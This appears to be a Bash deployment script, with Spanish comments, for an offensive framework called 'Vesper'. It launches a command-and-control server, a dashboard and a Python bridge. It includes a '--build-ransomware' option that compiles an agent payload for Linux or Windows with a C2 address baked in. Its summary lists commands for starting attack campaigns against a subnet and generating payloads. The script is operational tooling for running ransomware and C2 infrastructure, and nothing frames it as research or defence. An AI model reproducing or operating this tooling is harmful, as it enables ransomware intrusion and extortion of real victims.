#!/bin/bash
# Vesper — One-Click Deployment Script
# ====================================
# Levanta todo el stack: bridge Python, API Go, dashboard web, C2 server.
# Uso: ./scripts/deploy.sh [--dev|--prod] [--port 8443]

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
cd "$PROJECT_ROOT"

MODE="dev"
PORT="8443"
BUILD_PAYLOAD=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --dev) MODE="dev"; shift ;;
        --prod) MODE="prod"; shift ;;
        --port) PORT="$2"; shift 2 ;;
        --build-ransomware) BUILD_PAYLOAD="1"; shift ;;
        --c2) C2_ADDR="$2"; shift 2 ;;
        --target-os) TARGET_OS="$2"; shift 2 ;;
        --help|-h)
            echo "Vesper Deployment Script"
            echo ""
            echo "Uso: ./scripts/deploy.sh [opciones]"
            echo ""
            echo "Opciones:"
            echo "  --dev              Modo desarrollo (hot-reload Vite + Go API)"
            echo "  --prod             Modo produccion (Go sirve todo)"
            echo "  --port PORT        Puerto (default: 8443)"
            echo "  --build-ransomware Construir payload ransomware"
            echo "  --c2 ADDR          Direccion C2 para el payload (ej: 10.0.0.1:8443)"
            echo "  --target-os OS     OS objetivo del payload (linux, windows)"
            echo "  --help             Esta ayuda"
            exit 0
            ;;
        *) echo "Opción desconocida: $1"; exit 1 ;;
    esac
done

echo ""
echo "  ╔══════════════════════════════════════════════════════════╗"
echo "  ║              Vesper — DEPLOYMENT v3.2                    ║"
echo "  ╚══════════════════════════════════════════════════════════╝"
echo ""
echo "  Modo:     $MODE"
echo "  Puerto:   $PORT"
echo ""

# --- 1. Verificar dependencias ---
echo "[1/6] Verificando dependencias..."
command -v python3 >/dev/null 2>&1 || { echo "[-] python3 requerido"; exit 1; }
if [ "$MODE" = "prod" ]; then
    command -v go >/dev/null 2>&1 || { echo "[-] Go requerido para modo prod. Usa --dev."; exit 1; }
fi
echo "  [+] python3: $(python3 --version)"
if [ "$MODE" = "prod" ]; then
    echo "  [+] go: $(go version)"
fi
echo ""

# --- 2. Generar payload ransomware (opcional) ---
if [ -n "$BUILD_PAYLOAD" ]; then
    echo "[2/6] Construyendo payload ransomware..."
    TARGET_OS="${TARGET_OS:-linux}"
    C2_ADDR="${C2_ADDR:-localhost:$PORT}"

    if [ "$MODE" = "prod" ] && command -v go >/dev/null 2>&1; then
        cd "$PROJECT_ROOT"
        go build -o "dist/agent-${TARGET_OS}-amd64" \
            -ldflags "-s -w -X main.C2Addr=${C2_ADDR}" \
            ./internal/agent/cmd/agent/ 2>/dev/null && \
            echo "  [+] Payload: dist/agent-${TARGET_OS}-amd64" || \
            echo "  [!] Build falló. Usa 'make build-agent'"
    else
        echo "  [i] Payload generation requires Go. Use: vesper payload generate"
        echo "  [i] Target: ${TARGET_OS}/amd64 → C2: ${C2_ADDR}"
    fi
    echo ""
fi

# --- 3. Arrancar Python Bridge ---
echo "[3/6] Arrancando Python Bridge..."
BRIDGE_PID=""
BRIDGE_PORT=9100

if python3 -c "import sys; sys.path.insert(0,'$PROJECT_ROOT'); from modules.bridge.bridge import *" 2>/dev/null; then
    python3 "$PROJECT_ROOT/modules/bridge/bridge.py" &
    BRIDGE_PID=$!
    sleep 2
    echo "  [+] Bridge Python iniciado (PID=$BRIDGE_PID, puerto=$BRIDGE_PORT)"
else
    echo "  [!] Bridge no disponible. Ejecutando sin módulos Python."
fi
echo ""

# --- 4. Arrancar C2 Server ---
echo "[4/6] Arrancando C2 Server..."
C2_PID=""
if [ "$MODE" = "prod" ] && command -v go >/dev/null 2>&1; then
    go run ./plugins/pulse-c2/cmd/c2/ --port "$PORT" &
    C2_PID=$!
    sleep 1
    echo "  [+] C2 Server iniciado (PID=$C2_PID, puerto=$PORT)"
else
    echo "  [i] C2 server requiere Go en modo prod. Modo API standalone."
fi
echo ""

# --- 5. Arrancar Dashboard (API + Web) ---
echo "[5/6] Arrancando Dashboard..."

if [ "$MODE" = "dev" ]; then
    # Modo dev: Vite proxy + Go API
    echo "  [+] API Go: http://localhost:$PORT"
    echo ""
    echo "  Para el frontend (en otra terminal):"
    echo "    cd web && npm install && npm run dev"
    echo "    → http://localhost:3000"
    echo ""

    if command -v go >/dev/null 2>&1; then
        go run ./cmd/vesper/ dashboard --port "$PORT" &
        API_PID=$!
        echo "  [+] API iniciada (PID=$API_PID)"
    fi
else
    # Modo prod: Go sirve API + estáticos
    if command -v go >/dev/null 2>&1; then
        # Build web first if dist/ empty
        if [ ! -f "web/dist/index.html" ] && command -v npm >/dev/null 2>&1; then
            echo "  [*] Construyendo frontend..."
            (cd web && npm install --silent && npm run build) 2>/dev/null || true
        fi

        go run ./cmd/vesper/ dashboard &
        API_PID=$!
        echo "  [+] Dashboard iniciado (PID=$API_PID)"
    else
        echo "  [!] Go no instalado. No se puede arrancar el dashboard."
        echo "  [i] Instala Go: https://go.dev/dl/"
    fi
fi
echo ""

# --- 6. Mostrar resumen ---
echo "[6/6] Resumen de despliegue"
echo "  ─────────────────────────────────────────────────────"
echo "  Dashboard:   http://localhost:$PORT"
echo "  API REST:    http://localhost:$PORT/api"
echo "  WebSocket:   ws://localhost:$PORT/ws"
echo "  Health:      http://localhost:$PORT/api/health"
echo "  Bridge:      localhost:$BRIDGE_PORT"
echo "  ─────────────────────────────────────────────────────"
echo ""
echo "  Comandos útiles:"
echo "    vesper campaign start --name demo --target 10.0.0.0/24"
echo "    vesper payload generate --os windows --c2 10.0.0.1:$PORT"
echo "    vesper ai suggest"
echo "    vesper listeners list"
echo ""
echo "  Detener: Ctrl+C"
echo ""

# --- Cleanup on exit ---
cleanup() {
    echo ""
    echo "[*] Deteniendo servicios..."
    [ -n "$BRIDGE_PID" ] && kill "$BRIDGE_PID" 2>/dev/null
    [ -n "$C2_PID" ] && kill "$C2_PID" 2>/dev/null
    [ -n "$API_PID" ] && kill "$API_PID" 2>/dev/null
    echo "[+] Todos los servicios detenidos."
}
trap cleanup EXIT INT TERM

# Keep running
if [ -n "$API_PID" ] || [ -n "$BRIDGE_PID" ]; then
    echo "[*] Servicios corriendo. Ctrl+C para detener."
    wait
fi
